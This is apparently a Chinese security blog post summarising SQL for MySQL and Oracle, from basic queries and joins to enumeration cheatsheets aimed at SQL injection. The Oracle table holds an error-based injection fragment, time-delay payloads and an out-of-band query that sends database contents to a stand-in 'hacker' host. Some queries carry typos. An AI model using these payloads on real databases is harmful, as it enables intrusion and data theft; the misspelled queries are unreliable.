---
title: 关系型数据库小结
date: 2019-07-16 11:32:24
tags: 
category: websec
---
Oracle / Mysql 
<!-- more -->

## 安装数据库
[安装 oracle11g](https://github.com/wnameless/docker-oracle-xe-11g)

[安装Oracle-官方](https://github.com/oracle/docker-images)

安装Mysql:

```shell
docker run --name mysql -p 3306:3306 -v ~/data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=qwe123 -d mysql:5.7
```



## 基础通用 SQL 语句（增删改查）
关键字	| 含义 | 示例
---| --- | ---
SELECT     | 查询语句	                |select * from users;
DISTINCT   | 返回唯一不同的值，剔除重复值	|select distinct username from users;
WHERE	   | 条件连接	                |select * from users where username='jack';
AND&OR	   | 且或	                      |select * from users where username='jack' and username='marry';
ORDER BY   |	排序	| select username from users order by id asec;
INSERT INTO|	新增	| INSERT INTO Websites (name, url, alexa, country) VALUES ('百度','https://www.baidu.com/','4','CN');
UPDATE     |	更新	| UPDATE user set username='john' where username='jack';
DELETE     |	删除	| delete from users where username='john';

## 中级 SQL 语句
### 1- TOP	
> 返回记录的数目	
```sql
SQL Server / MSSQL : select top 1 username from users; 
MYSQL: select username from users limit 1; 
Oracle: select username from users where rownum = 1;"
```
### 2-LIKE
> 匹配	
```sql
select username from users where username like "G%" # 以 G 开头
select username from users where username like "%G" # 以 G 结尾
select username from users where username like "%G%" # 中间包含 G
select username from users where username like "_hon" # _ 表示任意一个字符
select username from users where username like "^[G]" # 表示 以 G 开头的字符
select username from users where username like "^[^G]" # 表示不以 G 开头的字符
select username from users where username like "[A-Z]ohn" # 表示 A-Z 任意字符
```
### 3-IN
> 在 WHERE 子句中规定多个值	
```sql
"SELECT * FROM Websites
WHERE name IN ('Google','菜鸟教程');"
```
### 4-BETWEEN	
> 介于之间，[1,20]	
```sql
"SELECT * FROM Websites
WHERE alexa BETWEEN 1 AND 20;"
```
### 5-AS	
>别名	
```sql
"SELECT name AS n, country AS c
FROM Websites;"
```

## 高级 SQL 语句
### join 连接查询
#### 内连接
![inner join](/postimg/img_innerjoin.gif)
```sql
SELECT column_name(s)
FROM table1
INNER JOIN table2
ON table1.column_name=table2.column_name;
```
#### 外连接-左连接和右连接
左连接：返回左边表，并以此为基准，返回符合条件的右边表
![left](/postimg/img_leftjoin.gif)
```sql
SELECT column_name(s)
FROM table1
LEFT JOIN table2
ON table1.column_name=table2.column_name;
```
右连接：返回右边表，并以此为基准，返回符合条件的左边表
![right](/postimg/img_rightjoin.gif)
```sql
SELECT column_name(s)
FROM table1
RIGHT JOIN table2
ON table1.column_name=table2.column_name;
```
### union 查询
UNION 操作符合并两个或多个 SELECT 语句的结果。前提是必须拥有相同数量的列。列也必须拥有相似的数据类型。
```SQL
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;
```


## 函数

### SQL Aggregate 函数
SQL Aggregate 函数计算从列中取得的值，返回一个单一的值。
```
AVG() - 返回平均值
COUNT() - 返回行数
FIRST() - 返回第一个记录的值
LAST() - 返回最后一个记录的值
MAX() - 返回最大值
MIN() - 返回最小值
SUM() - 返回总和
```
### SQL Scalar 函数
SQL Scalar 函数基于输入值，返回一个单一的值。
```
UCASE() - 将某个字段转换为大写
LCASE() - 将某个字段转换为小写
MID() - 从某个文本字段提取字符，MySql 中使用
SubString(字段，1，end) - 从某个文本字段提取字符
LEN() - 返回某个文本字段的长度
ROUND() - 对某个数值字段进行指定小数位数的四舍五入
NOW() - 返回当前的系统日期和时间
FORMAT() - 格式化某个字段的显示方式
ASCII() - 返回 ascii 码
```
## MySQL cheatsheet

## 枚举数据库配置信息

| 数据                    | 查询语句                                                     |
| ----------------------- | ------------------------------------------------------------ |
| 版本                    | `SELECT @@version`                                           |
| 当前用户                | `SELECT user(); SELECT system_user();`                       |
| 列出用户 (需要一定权限) | `SELECT user FROM mysql.user;`                               |
| 列出当前用户权限        | `SELECT grantee,privilege_type,is_grantable FROM information_schema.user_privileges;` |
| 当前数据库              | `SELECT database();`                                         |
| 列出数据库              | `SELECT schema_name FROM information_schema.schemata;`       |
| 列出表                  | `SELECT table_name from information_schema.tables where table_schema=database();` |
| 列出列                  | `SELECT column_name from information_schema.columns where table_name="<table_name>"` |
| 字符串长度              | `LENGTH()`                                                   |
| 提取子字符串            | `SELECT SUBSTR(string,offset,length);` <br>`SELECT SUBSTRING(string,offset,length)` |
| 不带引号                | `SELECT char(65,66,67)`                                      |
| 触发时间延迟            | `BENCHMARK(1000000,MD5("HACK!")); SLEEP(10) # 十秒延迟`      |
| IF 语句                 | `SELECT if(1=1,'A','B')`                                     |



## Oracle cheatsheet

## 枚举配置信息

| 数据               | 查询                                                         |
| ------------------ | ------------------------------------------------------------ |
| 版本               | `SELECT banner from v$version;`                              |
| 当前用户           | `SELECT user from dual;`                                     |
| 列出用户           | `SELECT username from all_users order by username`           |
| 当前用户权限       | `SELECT * from user.role_privs;` <br>`SELECT * from user_tab_privs;`<br>`SELECT * from user_sys_privs;` <br>`SELECT sys_context('USERENV','ISDBA') from dual;`<br>`SELECT grantee from dba_sys_privs where privilege='SELECT ANY DICTIONARY'` |
| 数据库名           | `SELECT global_name from global_name;`                       |
| 列出模式/user      | `SELECT username from all_users;`                            |
| 列出表名及模式     | `SELECT ower,table_name from all_users;`                     |
| 列出列             | `SELECT ower,table_name,column_name from all_tab_columns where table_name="<name>";` |
| 应用服务器主机名   | `SELECT sys_context('USERENV','HOST') from dual;`<br>`SELECT sys_context('USERENV','SERVRE_HOST') from dual;` |
| 数据库主机名       | `SELECT UTL_INADDR.get_host_name from dual;`                 |
| 建立外部连接       | `SELECT utl_http.request('http://hacker:1001/'\|\|(SELECT banner from v$version where rownum=1)) from dual; ` <br>攻击者的http请求中包含了 oracle 数据库检索的结果 |
| 引发错误           | `AND (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1` |
| 经过加密的表       | `SELECT table_name,column_name,encryption_alg,salt from dba_encrypted_columns;`<br> 从 oracle10 开始对表进行了透明加密，考虑性能问题，只对重要的列进行加密 |
| 列出对加密库的对象 | `SELECT owner, name,type,referenced_name from all_dependencies;` |
| 字符串长度         | `LENTH()`                                                    |
| 提取子字符串       | `SELECT SUBSTR(string offset,length) from dual;`             |
| 时间延迟           | `SELECT UTL_INADDR.get_host_address('nowhere999.zom') from dual;` |
| `chr` 函数         | `SELECT chr(65) from dual;`                                  |

